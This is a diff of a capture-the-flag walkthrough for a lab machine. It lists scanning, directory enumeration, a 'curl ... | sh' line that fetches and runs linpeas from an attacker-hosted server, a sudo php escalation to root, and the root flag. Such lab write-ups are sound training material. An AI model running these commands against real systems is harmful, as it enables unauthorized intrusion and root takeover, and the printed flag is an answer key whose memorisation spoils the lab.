@@ -5,11 +5,10 @@ Tips
 Methodology
 - Enumeration Scanning
 - Exploitation
-- Privilege Escalation
-
-- 
+- Privilege Escalation 
 
 ## Steps
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Enumeration/Scanning with Nmap - perform a quick scan for open ports followed by a full port scan
 
 Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include whatweb and Gobuster
@@ -24,6 +23,7 @@ Perform manual and automated enumeration of the file system, looking for misconf
 
 Organize this data offline to determine the various ways to escalate privileges to root on this target
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 1. sudo -sV -sC -O --min-rate=1000 --script=http-enum --top-ports=5000 -o nmapscan -vv
 
 2. gobuster dir -u http://10.129.121.73 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o directories
@@ -52,11 +52,11 @@ python3 -m http.server 8000 and download linpeas.sh on it
 download linpeas on target machine
 curl http://LOCAL_IP:8000/linpeas.sh | sh
 
-after downloading linpeas.sh and run sudo -l found that can run all commands under the /usr/bin/php
+after downloading linpeas.sh and run sudo -l found that user can run all commands under the /usr/bin/php
 User www-data may run the following commands on gettingstarted:
     (ALL : ALL) NOPASSWD: /usr/bin/php
     
- so go to https://gtfobins.github.io/gtfobins/php/#sudo 
+ so go to https://gtfobins.github.io/gtfobins/php/#sudo
 
 
 and enter these commands on target machine 
@@ -64,8 +64,7 @@ and enter these commands on target machine
 CMD="/bin/sh"
 sudo php -r "system('$CMD');"
 
-whoami 
--> root 
+whoami -> root 
 cd /root
 cat root.txt
 flag: f1fba6e9f71efb2630e6e34da6387842
